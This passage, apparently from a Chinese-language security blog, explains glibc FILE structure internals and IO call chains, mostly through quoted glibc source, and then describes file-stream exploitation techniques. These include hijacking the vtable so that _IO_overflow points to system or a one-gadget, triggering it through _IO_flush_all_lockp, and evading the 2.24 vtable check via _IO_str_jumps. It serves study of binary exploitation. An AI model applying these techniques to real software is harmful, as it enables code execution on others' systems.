*vtable</h5><p><code>vtable</code>就是我们常说的虚表，他是一个重要的指针，指向一系列IO相关的函数指针。常规文件流的vtable类型为<code>_IO_jump_t</code>,定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在libc中定义的vtable有<code>_IO_file_jumps</code>, <code>_IO_str_jumps</code>, <code>_IO_cookie_jumps</code>等。</p><p>FILE头和vtable的偏移在64位下一般是xd8大小，整个<code>_IO_FILE_plus</code>结构体内部偏移如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><h3 id="常用IO函数调用链分析"><a href="#常用IO函数调用链分析" class="headerlink" title="常用IO函数调用链分析"></a>常用IO函数调用链分析</h3><h5 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h5><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">(<span class="type">void</span> *__restrict __ptr, <span class="type">size_t</span> __size,<span class="type">size_t</span> __n, FILE *__restrict __stream)</span>;</span><br></pre></td></tr></table></figure><p>又有宏定义<code>#define fread(p, m, n, s) _IO_fread (p, m, n, s)</code>。于是我们追踪<code>_IO_fread</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_sgetn</code>函数（在genops.c中）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_XSGETN</code>就是vtable中的函数指针之一，默认指向<code>_IO_file_xsgetn</code>。</p><h5 id="其他常见函数对应指针总结"><a href="#其他常见函数对应指针总结" class="headerlink" title="其他常见函数对应指针总结"></a>其他常见函数对应指针总结</h5><ul><li>printf&#x2F;puts -&gt;<code>_IO_XSPUTN</code>-&gt;_<code>IO_OVERFLOW</code></li><li>scanf&#x2F;gets -&gt; <code>_IO_XSGETN</code></li><li>fwrite -&gt; <code>_IO_XSPUTN</code>-&gt;<code>_IO_OVERFLOW</code></li><li>fread -&gt; <code>_IO_XSGETN</code></li><li>fclose -&gt; <code>_IO_FINISH</code></li><li>exit -&gt; <code>_IO_flush_all_lockp</code> -&gt;<code>_IO_OVERFLOW</code></li></ul><p>顺带一提，当我们用printf输出一个以换行符结尾的纯字符串的时候，printf会被优化成puts函数并去除换行符。</p><h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h5><p>我们顺便关注一下一个文件流被创建的过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#   <span class="keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数被稍微封装了一下，回归到<code>__fopen_internal</code>函数。函数malloc了一块地址用来存放FILE，由此可知一般文件流的FILE是被放在堆上的。</p><p>接着用<code>_IO_no_init</code>函数和<code>_IO_JUMPS</code>初始化了vtable：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS(THIS) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure><p>然后初始化FILE结构本身，将新的FILE链入链表中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后调用系统调用打开文件，就算完成了一次fopen。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>每一个FILE结构中的vtable指针指向同一个位置，通常会将<code>_IO_overflow_t</code>改为system(参数写在flags位上)或onegadget地址完成利用。</p><h5 id="IO-flush-all-lockp"><a href="#IO-flush-all-lockp" class="headerlink" title="_IO_flush_all_lockp"></a>_IO_flush_all_lockp</h5><p>调用<code>_IO_flush_all_lockp</code>时，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的_IO_overflow。</p><p>我们重点关注这个函数及相关调用是因为攻击者常常利用这个函数来进行一系列的攻击操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li>当 libc 执行 abort 流程时（2.26开始被删除）</li><li>当执行 exit 函数时</li><li>当执行流从 main 函数返回时</li></ol><p>且为了使<code>_IO_flush_all_lockp</code>能正常工作，我们要满足调用<code>_IO_OVERFLOW</code>的其他条件，即</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code></li></ul><p>由此构造<code>_IO_FILE_plus</code>和vtable的<code>_IO_OVERFLOW</code>（位于0x18偏移处）</p><h5 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h5><p>2.23版本中对vtable没有检查，可以在可控地址上伪造虚表后，再劫持原本的vtable指针为伪造的虚表。</p><h5 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h5><p>2.24中新增了对vtable指针的检测，检查该地址是否合法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IO_validate_vtable (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其首先检查vtable是否在libc的数据段上，如果不在，则检查其是否在ld等其他模块的合法位置，若否则报错。然而这个检查跳过了<code>_IO_str_jumps</code>和<code>IO_wstr_jumps</code>这两个与原本vtable结构相同的虚表，则我们可以通过劫持这两个虚表，再修改vtable指针即能绕过检查。</p><figure class="highlight c"><table><tr><td 